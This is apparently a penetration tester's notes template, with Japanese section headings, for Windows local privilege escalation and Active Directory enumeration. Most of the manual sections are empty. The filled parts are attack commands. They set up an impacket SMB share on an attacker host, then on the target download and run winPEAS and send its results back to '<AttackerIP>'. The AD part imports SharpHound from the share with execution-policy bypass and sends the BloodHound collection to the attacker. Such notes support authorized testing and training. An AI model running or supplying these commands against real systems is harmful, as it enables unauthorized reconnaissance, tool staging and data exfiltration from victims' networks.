# Local

## Auto w/ WinPEAS

### 転送・実行

```zsh
# Attacker
mkdir share
cp /usr/share/peass/winpeas/winPEASx64.exe share/
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
cd ~
net use \\<AttackerIP>\share /user:username pw
cp \\<AttackerIP>\share\winPEASx64.exe .
.\winPEASx64.exe | Tee-Object -FilePath \\<AttackerIP>\share\peas_result.txt
```

### 実行結果抽出

```powershell

```

---
---

## Manual

### ユーザー


---

### システム情報


---

### ネットワーク


---

### インストール済みアプリケーション


---

### 実行中のプロセス


---

### PowerShellログ


---

### サービス


---

### スケジュールタスク


---

### 興味深い情報


---
---

# AD

## Auto w/ BloodHound

```zsh
# Attacker(作成済みのSMB共有を使う)
cp /opt/bloodhound/SharpHound.ps1 share
```
```powershell
# Target(smb共有をすでに使っているとしてnet useはスキップ)
powershell -ep bypass
net use \\<AttackerIP>\share /user:username pw
Import-Module \\<AttackerIP>\share\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory \\<AttackerIP>\share -ZipFileName 'audit.zip'
```